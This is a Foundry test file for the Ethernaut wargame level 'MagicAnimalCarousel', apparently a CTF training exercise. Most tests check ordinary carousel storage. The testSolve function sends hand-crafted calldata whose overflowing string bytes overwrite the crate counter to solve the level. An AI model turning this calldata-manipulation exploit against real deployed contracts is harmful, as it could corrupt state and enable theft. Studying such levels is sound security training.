// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import "forge-std/Test.sol";
import {Utils} from "test/utils/Utils.sol";

import {MagicAnimalCarousel} from "src/levels/MagicAnimalCarousel.sol";
import {MagicAnimalCarouselFactory} from "src/levels/MagicAnimalCarouselFactory.sol";
import {Level} from "src/levels/base/Level.sol";
import {Ethernaut} from "src/Ethernaut.sol";

contract TestMagicAnimalCarousel is Test, Utils {
    Ethernaut ethernaut;
    MagicAnimalCarousel instance;

    address payable owner;
    address payable player;

    /*//////////////////////////////////////////////////////////////
                                 HELPERS
    //////////////////////////////////////////////////////////////*/

    function setUp() public {
        address payable[] memory users = createUsers(2);

        owner = users[0];
        vm.label(owner, "Owner");

        player = users[1];
        vm.label(player, "Player");

        vm.startPrank(owner);
        ethernaut = getEthernautWithStatsProxy(owner);
        MagicAnimalCarouselFactory factory = new MagicAnimalCarouselFactory();
        ethernaut.registerLevel(Level(address(factory)));
        vm.stopPrank();

        vm.startPrank(player);
        instance = MagicAnimalCarousel(payable(createLevelInstance(ethernaut, Level(address(factory)), 0)));
        vm.stopPrank();
    }

    /*//////////////////////////////////////////////////////////////
                                 TESTS
    //////////////////////////////////////////////////////////////*/

    /// @notice Check the intial state of the level and enviroment.
    function testInit() public {
        vm.startPrank(player);
        assertEq(instance.currentCrateId(), 0);
        assertEq(instance.carousel(0), 1 << 160);
        submitLevelInstance(ethernaut, address(instance));
        assertFalse(submitLevelInstance(ethernaut, address(instance)));
    }

    function testAnimalsShouldBeStoredOk() public {
        vm.startPrank(player);
        string memory dog = "Dog";
        uint256 dogEnc = uint256(bytes32(abi.encodePacked(dog)));
        instance.setAnimalAndSpin(dog);
        assertEq(instance.currentCrateId(), 1);
        assertEq(instance.carousel(1), dogEnc | 2 << 160 | uint160(address(player)));

        string memory goat = "Goat";
        uint256 goatEnc = uint256(bytes32(abi.encodePacked(goat)));
        instance.setAnimalAndSpin(goat);
        assertEq(instance.currentCrateId(), 2);
        assertEq(instance.carousel(2), goatEnc | 3 << 160 | uint160(address(player)));

        //MAX_CAPACITY == 4
        //  string memory fish = "Fish";
        //  uint256 fishEnc = uint256(bytes32(abi.encodePacked(fish)));
        //  instance.setAnimalAndSpin(fish);
        //  assertEq(instance.currentCrateId(), 3);
        //  assertEq(instance.carousel(3), fishEnc | 0 << 160 | uint160(address(player)));
    }

    function testNonOwnerShouldNotBeAbleToChangeAnimal() public {
        vm.startPrank(player, player);
        instance.setAnimalAndSpin("Echidna");
        vm.stopPrank();
        vm.expectRevert();
        instance.changeAnimal("Pidgeon", 1);
    }

    function testOwnerShouldBeAbleToChangeAnimal() public {
        vm.startPrank(player, player);

        string memory pidgeon = "Pidgeon";
        uint256 pidgeonEnc = uint256(bytes32(abi.encodePacked(pidgeon)));
        instance.setAnimalAndSpin("Echidna");
        instance.changeAnimal(pidgeon, 1);
        assertEq(instance.currentCrateId(), 1);
        assertEq(instance.carousel(1), pidgeonEnc | 2 << 160 | uint160(address(player)));
    }

    function testCangeAnimalWithZeroShouldKeepSameAnimal() public {
        vm.startPrank(player, player);
        instance.setAnimalAndSpin("Echidna");
        string memory fish = "Fish";
        uint256 fishEnc = uint256(bytes32(abi.encodePacked(fish))) >> 176;
        instance.setAnimalAndSpin(fish);
        instance.changeAnimal("", 2);
        uint256 animalInSlot = instance.carousel(2) >> 176;
        assertEq(animalInSlot, fishEnc);
    }

    /// @notice Test the solution for the level.
    function testSolve() public {
        vm.startPrank(player, player);
        instance.setAnimalAndSpin("Echidna");
        bytes memory payload = abi.encodePacked(uint256(64), uint256(1), uint256(12), hex"31323334353637383930ffff");
        (bool success, ) = address(instance).call(abi.encodePacked(instance.changeAnimal.selector, payload));
        assertTrue(success);
        instance.setAnimalAndSpin("Pidgeon");
        assertEq(instance.currentCrateId(), type(uint16).max);
        assertTrue(submitLevelInstance(ethernaut, address(instance)));
    }
}
